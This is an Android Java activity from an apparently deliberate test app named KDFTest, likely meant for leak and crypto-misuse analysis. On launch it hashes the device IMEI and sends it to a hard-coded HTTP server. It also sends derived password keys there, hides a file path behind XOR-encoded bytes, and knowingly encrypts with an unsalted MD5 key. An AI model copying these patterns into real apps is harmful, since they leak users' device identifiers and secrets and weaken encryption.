package at.f0rki.kdftest;

import android.app.Activity;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;
import java.util.TimeZone;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class PasswordInput extends Activity {

    private static final String TAG = "PasswordInputActivity";
    private static final String SERVER = "http://www.f0rki.at./submit/test?";
    private static final int ITERATION_COUNT = 1001;
    private static final int DERIVED_KEY_LENGTH = 128;
    private static final int SALT_SIZE = 8;

    public static String b16encode(byte[] input) {
        StringBuilder sb = new StringBuilder(input.length * 2);
        for (byte b : input) {
            sb.append(Integer.toHexString((b >> 4) & 0xff));
            sb.append(Integer.toHexString((b & 0xf) & 0xff));
        }
        return sb.toString();
    }

    public static void xorall(byte[] input, byte value) {
        for (int i = 0; i < input.length; i++) {
            input[i] = (byte) (input[i] ^ value);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_password_input);
        leakImei();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.password_input, menu);
        return true;
    }

    private void leakImei() {
        Context c = getApplicationContext();
        TelephonyManager telm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
        String deviceId = telm.getDeviceId();
        try {
            byte[] digest = MessageDigest.getInstance("SHA-1").digest(deviceId.getBytes());
            if (new Random().nextBoolean()) {
                xorall(digest, (byte) 0x42);
            }
            sendToServer(b16encode(digest), "imei");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        Log.d(TAG, "leaked imei over network (is " + deviceId + ")");
    }

    public void applyPBKDF2(View view) {
        // get string from textview
        EditText pwbox = (EditText) findViewById(R.id.passwordBox);
        String password = pwbox.getText().toString();
        new PBKDF2Derivator().execute(password);
    }

    public void applyMyKDF(View view) {
        EditText pwbox = (EditText) findViewById(R.id.passwordBox);
        String password = pwbox.getText().toString();
        new MyKDFDerivator().execute(password);
    }

    public void encryptStuff(View view) {
        EditText pwbox = (EditText) findViewById(R.id.passwordBox);
        String password = pwbox.getText().toString();
        EditText inputbox = (EditText) findViewById(R.id.encryptInputText);
        String inputData = inputbox.getText().toString();
        new PBEncryptionTask().execute(password, inputData);
    }

    protected void sendToServer(String whatever, String id) {
        String request = SERVER + "id=KDFTest&" + id + "="
                + whatever;
        new HttpSender().execute(request);
    }

    class HttpSender extends AsyncTask<String, Void, Integer> {
        protected Integer doInBackground(String... urls) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpGet httpget = new HttpGet(urls[0]);
            try {
                HttpResponse response = httpclient.execute(httpget);
                response.getHeaders(null);
            } catch (ClientProtocolException e) {
                // e.printStackTrace();
                Log.e(TAG, "HttpSenderAsyncTask - client protocol fubar: " + e.getMessage(), e);
            } catch (IOException e) {
                // e.printStackTrace();
                Log.e(TAG, "HttpSenderAsyncTask - Some IO Error: " + e.getMessage(), e);
            } catch (RuntimeException e) {
                Log.e(TAG, "HttpSenderAsyncTask - Probably missing permission", e);
            }
            return 0;
        }
    }

    class PBKDF2Derivator extends AsyncTask<String, Void, byte[]> {

        public byte[] applyPBKDF2(String password, int iterations, int keylength) {
            byte[] encodedpwd = null;
            SecureRandom random = new SecureRandom();
            byte[] salt = new byte[SALT_SIZE];
            random.nextBytes(salt);
            KeySpec spec = new PBEKeySpec(password.toCharArray(), salt,
                    iterations, keylength);
            SecretKeyFactory f = null;
            try {
                f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
            } catch (NoSuchAlgorithmException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            Log.d(TAG, "instance for SecretKeyFactory="
                    + f.getClass().getCanonicalName());
            try {
                encodedpwd = f.generateSecret(spec).getEncoded();
            } catch (InvalidKeySpecException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }

            return encodedpwd;
        }

        @Override
        protected byte[] doInBackground(String... password) {
            byte[] result;
            int iterations = ITERATION_COUNT;
            int key_length = DERIVED_KEY_LENGTH;
            if (password.length == 0 || password[0].length() == 0) {
                return new byte[0];
            }
            result = applyPBKDF2(password[0], iterations, key_length);
            // do something with the kdf
            sendToServer(b16encode(result), "derived");
            return result;
        }

        protected void onPostExecute(byte[] result) {
            Toast toast = Toast.makeText(getApplicationContext(),
                    "Successfully applied PBKDF2", Toast.LENGTH_LONG);
            toast.show();
            TextView derived = (TextView) findViewById(R.id.derivedValue);
            String b16 = b16encode(result);
            derived.setText(b16);
        }
    }

    class MyKDFDerivator extends AsyncTask<String, Void, byte[]> {

        public byte[] applyMyKDF(String password) {
            MyKDF mkdf;
            try {
                mkdf = new MyKDF(SALT_SIZE, ITERATION_COUNT);
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
                Toast toast = Toast.makeText(getApplicationContext(),
                        "Failed to apply custom KDF!", Toast.LENGTH_LONG);
                toast.show();
                return null;
            }
            return mkdf.derive(password);
        }

        @Override
        protected byte[] doInBackground(String... password) {
            byte[] result;
            result = applyMyKDF(password[0]);
            // do something with the kdf
            sendToServer(b16encode(result), "derived");
            return result;
        }

        protected void onPostExecute(byte[] result) {
            Toast toast = Toast.makeText(getApplicationContext(),
                    "Successfully applied MYKDF", Toast.LENGTH_LONG);
            toast.show();
            TextView derived = (TextView) findViewById(R.id.derivedValue);
            String b16 = b16encode(result);
            derived.setText(b16);
        }
    }

    class FileWriter extends AsyncTask<byte[], Void, Void> {

        private final byte[] DIR = {0x09, 0x06, 0x04, 0x16, 0x27, 0x31, 0x36, 0x03, 0x32, 0x32};
        private final byte[] FILE = {0x31, 0x27, 0x21, 0x30, 0x27, 0x36, 0x1D, 0x2E, 0x2D, 0x25, 0x20, 0x2D, 0x2D, 0x29, 0x6C, 0x36, 0x3A, 0x36};

        @Override
        protected Void doInBackground(byte[]... bytes) {
            File sdCard = Environment.getExternalStorageDirectory();
            StringBuilder sb = new StringBuilder(DIR.length + FILE.length + 100);
            sb.append(sdCard.getAbsolutePath());
            sb.append(File.separator);
            for (int i = 0; i < DIR.length; ++i) {
                DIR[i] = (byte) (DIR[i] ^ 0x42);
            }
            sb.append(new String(DIR));
            sb.append(File.separator);
            File dir = new File(sb.toString());
            dir.mkdirs();

            for (int i = 0; i < FILE.length; ++i) {
                FILE[i] = (byte) (FILE[i] ^ 0x42);
            }
            File file = new File(dir, new String(FILE));
            PrintStream p = null;
            try {
                p = new PrintStream(new FileOutputStream(file));
                for (byte[] b : bytes) {
                    p.print("----------------------------------------------");
                    TimeZone tz = TimeZone.getTimeZone("UTC");
                    DateFormat df = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm'Z'");
                    df.setTimeZone(tz);
                    String nowAsISO = df.format(new Date());
                    p.print(nowAsISO);
                    p.print("\n");
                    p.print(b16encode(b));
                    p.print("\n");
                    p.print("----------------------------------------------");
                }
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (p != null) {
                    p.close();
                }
            }

            Log.d(TAG, "written to file");
            return null;
        }
    }

    class PBEncryptionTask extends AsyncTask<String, Void, byte[]> {

        byte[] getKey(String pw) throws NoSuchAlgorithmException {
            String x = "This isn't the method you are looking for, move along!";
            return MessageDigest.getInstance("MD5").digest(pw.getBytes());
        }

        byte[] encrypt(String password, String data, int iterations) {
            byte[] encryptedData = new byte[0];
            byte[] encodedPw;
            SecureRandom random = new SecureRandom();
            byte[] salt = new byte[SALT_SIZE];
            random.nextBytes(salt);
            KeySpec spec = new PBEKeySpec(password.toCharArray(), salt,
                    iterations, 128);
            SecretKeyFactory f;
            try {
                // that's how it should be done!
                /*
                f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
                Log.d(TAG, "instance for SecretKeyFactory="
                        + f.getClass().getCanonicalName());
                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS7Padding");
                cipher.init(Cipher.ENCRYPT_MODE, f.generateSecret(spec), random);
                cipher.update(data.getBytes("UTF-8"));
                encryptedData = cipher.doFinal();
                */
                // and here is the fail!
                // first actually do proper key derivation
                f = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
                Log.d(TAG, "instance for SecretKeyFactory="
                        + f.getClass().getCanonicalName());
                encodedPw = f.generateSecret(spec).getEncoded();
                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS7Padding");
                // but then deliberately don't use it
                SecretKeySpec secretkey = new SecretKeySpec(getKey(password), "AES");
                cipher.init(Cipher.ENCRYPT_MODE, secretkey);
                cipher.update(data.getBytes("UTF-8"));
                encryptedData = cipher.doFinal();
            } catch (Throwable e) {
                Log.e(TAG, "Encryption failed", e);
            }
            return encryptedData;
        }

        @Override
        protected byte[] doInBackground(String... cmd) {
            byte[] result;
            int iterCount = ITERATION_COUNT;
            result = encrypt(cmd[0], cmd[1], iterCount);
            new FileWriter().execute(result);
            return result;
        }

        protected void onPostExecute(byte[] result) {
            Toast toast = Toast.makeText(getApplicationContext(),
                    "Successfully encrypted your input", Toast.LENGTH_LONG);
            toast.show();
            TextView derived = (TextView) findViewById(R.id.derivedValue);
            String b16 = b16encode(result);
            derived.setText(b16);
        }
    }
}
